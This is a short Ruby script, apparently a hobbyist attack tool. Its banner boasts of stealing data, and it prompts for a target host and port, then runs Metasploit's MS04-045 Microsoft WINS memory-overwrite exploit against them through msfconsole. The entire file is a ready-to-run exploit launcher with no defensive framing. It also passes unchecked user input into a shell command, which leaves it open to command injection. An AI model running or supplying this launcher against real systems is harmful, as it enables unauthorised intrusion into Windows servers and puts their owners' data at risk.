require 'colorize'
puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  

      1st Try {set RPORT 42; 2nd RPORT ?}

           Microsoft WINS Service Memory Overwrite
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp


exec("msfconsole -x 'use exploit/windows/wins/ms04_045_wins' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'run'")

